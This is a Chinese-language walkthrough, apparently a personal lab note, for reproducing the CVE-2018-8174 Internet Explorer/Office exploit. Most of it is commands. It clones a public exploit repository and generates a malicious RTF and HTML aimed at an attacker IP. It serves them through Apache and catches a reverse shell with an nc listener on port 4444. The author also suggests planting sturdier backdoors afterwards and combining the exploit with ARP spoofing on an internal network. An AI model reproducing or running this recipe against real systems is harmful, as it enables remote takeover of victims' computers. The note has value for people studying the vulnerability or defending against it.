# CVE-2018-8174

## 漏洞简单说明

利用浏览器0day漏洞的新型Office文档攻击。该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在`浏览网页或打开Office文档`时都可能中招，最终被黑客植入后门木马完全控制电脑。

## 复现

下载python脚本保存到本地  
`git clone https://github.com/Yt1g3r/CVE-2018-8174_EXP.git`

开启apache服务  
`service apache2 start`

运行CVE-2018-8174.py生成攻击TRF（exp.rtf）和攻击HTML（exploit.html）  
`python CVE-2018-8174.py -u http://192.168.3.21/exploit.html -o exp.rtf -i 192.168.3.21 -p 4444`

将攻击文件移至web服务目录下  
`cp exp* /var/www/html`

攻击机运行nc监听  
`nc -lvvp 4444`

被攻击者访问攻击web页面即可反弹shell。  
可将 exploit.html 改名为 index.html 那样直接访问IP就能获得 shell ，而不用添加访问目录。  
之后可以上传一些比较健壮的后门。  
据说用word打开 rtf 文件也能反弹回 shell 。但是我没环境测试，且都得是32位的系统（ IE 和 Word ）。

后续看情况测试一下内网arp欺骗综合利用一下这个漏洞。